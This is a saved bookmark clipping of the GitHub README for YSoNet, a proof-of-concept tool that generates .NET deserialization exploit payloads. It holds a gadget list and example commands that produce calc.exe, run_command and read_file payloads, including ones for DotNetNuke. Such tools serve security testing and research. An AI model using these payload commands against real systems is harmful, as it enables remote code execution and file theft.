---
raindrop_id: 1321645906
raindrop_highlights:
  68c29f5868835c5264975836: dcfef91b0842db7f19c29956ae617c53
  68c29f606de7bebc57f77994: 8c301735fcf85855c73190d762be31c7
  68c29f639c6f15ca4ebe8049: b1b8db1b9ba21630b44757b8f53b69d5
  68c29f6ca1c5b828edfe209f: f34b856fc5af8ea6055419071bbfb53e
  68c29f7b6de7bebc57f77e70: efc70c84292fa5203a9cf998ba09c684
  68c29f86a04e81c1a4185723: f1d87b615ca4540b77938b22ee3cc487
  68c29f916552a70713d7149c: f2f350a40bbeaef64efbc2dcf97ea9af
  68c29f96b7859f7c6f689677: 57cf4d8251137d6d016ecbbc324543b5
  68c29fb09bd200cef725e1e4: 54370d9116826e2240b8f0c48b99327a
title: "GitHub - irsdl/ysonet: Deserialization payload generator for a variety of .NET formatters [app] [exp]"

description: |-
  Deserialization payload generator for a variety of .NET formatters - irsdl/ysonet

source: https://github.com/irsdl/ysonet

created: 1753572516000
type: link
tags: ["_index"]

 
  - "Tools"

---
# GitHub - irsdl/ysonet: Deserialization payload generator for a variety of .NET formatters [app] [exp]

![](https://opengraph.githubassets.com/25865026af9c12c1fbea8f3a323ecdcb1d46628a8ea1cfe57a52790c0cb047c0/irsdl/ysonet)

> [!summary]
> Deserialization payload generator for a variety of .NET formatters - irsdl/ysonet





Deserialization payload generator for a variety of .NET formatters
YSoNet is a fork of the original YSoSerial.Net
Visit: https://ysonet.net
A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.
Description

YSoNet (previously known as ysoserial.net) is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects.
Installation

In order to obtain the latest version, it is recommended to download it from the Actions page.
Usage

Use ysonet.exe --fullhelp to see more details.
$ ./ysonet.exe --help == GADGETS == (*) ActivitySurrogateDisableTypeCheck (BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter) (*) ActivitySurrogateSelector (BinaryFormatter (2), LosFormatter, SoapFormatter) (*) ActivitySurrogateSelectorFromFile (BinaryFormatter (2), LosFormatter, SoapFormatter) (*) AxHostState (BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter) (*) BaseActivationFactory (Json.NET)
Examples
Generate a calc.exe payload for Json.Net using ObjectDataProvider gadget.
$ ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t

Generate a calc.exe payload for BinaryFormatter using PSObject gadget.
$ ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t

Generate a run_command payload for DotNetNuke using its plugin
$ ./ysonet.exe -p DotNetNuke -m run_command -c calc.exe

Generate a read_file payload for DotNetNuke using its plugin
$ ./ysonet.exe -p DotNetNuke -m read_file -f win.ini